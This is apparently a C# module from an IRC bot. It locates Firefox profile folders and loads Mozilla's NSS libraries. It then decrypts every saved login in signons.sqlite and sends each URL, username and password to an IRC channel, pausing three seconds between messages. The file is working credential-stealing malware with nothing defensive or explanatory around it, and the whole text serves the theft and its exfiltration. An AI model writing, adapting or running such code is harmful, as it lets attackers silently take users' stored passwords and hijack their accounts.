﻿using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Data;
using System.Text;
using System.Threading;

namespace myApp
{
    static class FFDecryptor
    {
        public class SHITEMID
        {
            public static long cb;
            public static byte[] abID;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        public static string Log;

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr NSS3;
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);
        public static long NSS_Init(string configdir)
        {
            string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
            LoadLibrary(MozillaPath + "mozcrt19.dll");
            LoadLibrary(MozillaPath + "nspr4.dll");
            LoadLibrary(MozillaPath + "plc4.dll");
            LoadLibrary(MozillaPath + "plds4.dll");
            LoadLibrary(MozillaPath + "ssutil3.dll");
            LoadLibrary(MozillaPath + "sqlite3.dll");
            LoadLibrary(MozillaPath + "nssutil3.dll");
            LoadLibrary(MozillaPath + "softokn3.dll");
            NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
            IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
            return dll(configdir);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate2();
        public static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
            DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
            return dll();
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
            DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
            return dll(slot, loadCerts, wincx);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
            DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }
        //PK11_GetInternalKeySlot

        public static string signon;

        public static void GetFF()
        {
            bool FoundFile = false;
            long KeySlot = 0;
            string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
            string DefaultPath = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\Profiles";
            string[] Dirs = Directory.GetDirectories(DefaultPath);
            foreach (string dir in Dirs)
            {
                if (!FoundFile)
                {
                    string[] Files = Directory.GetFiles(dir);
                    foreach (string CurrFile in Files)
                    {
                        if (!FoundFile)
                        {
                            if (System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite"))
                            {
                                NSS_Init(dir);
                                signon = CurrFile;
                            }
                        }

                        else
                        {
                            break;
                        }
                    }
                }
                else
                {
                    break;
                }
            }

            string dataSource = signon;
            new TSECItem();
            TSECItem tSecDec = new TSECItem();
            TSECItem tSecDec2 = new TSECItem();
            byte[] bvRet;
            SQLiteBase db = new SQLiteBase(dataSource);

            DataTable table = db.ExecuteQuery("SELECT * FROM moz_logins;");
            DataTable table2 = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
            foreach (DataRow row in table2.Rows)
            {
                Log = row["hostname"].ToString();
            }
            KeySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(KeySlot, true, 0);
            foreach (DataRow Zeile in table.Rows)
            {
                string formurl = Convert.ToString(Zeile["formSubmitURL"].ToString());
                Log = Log + "URL: " + formurl + " ";
                StringBuilder se = new StringBuilder(Zeile["encryptedUsername"].ToString());
                int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
                TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                        Log = Log + "USER: " + Encoding.ASCII.GetString(bvRet) + " ";
                    }
                }
                StringBuilder se2 = new StringBuilder(Zeile["encryptedPassword"].ToString());
                int hi22 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length);
                TSECItem item2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi22), typeof(TSECItem));
                if (PK11SDR_Decrypt(ref item2, ref tSecDec2, 0) == 0)
                {
                    if (tSecDec2.SECItemLen != 0)
                    {
                        bvRet = new byte[tSecDec2.SECItemLen];
                        Marshal.Copy(new IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen);
                        Log = Log + "PASSWORD: " + Encoding.ASCII.GetString(bvRet);
                    }
                }
                Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  8" + Log);
                Log = "";
                Thread.Sleep(3000);
            }
        }

    }
}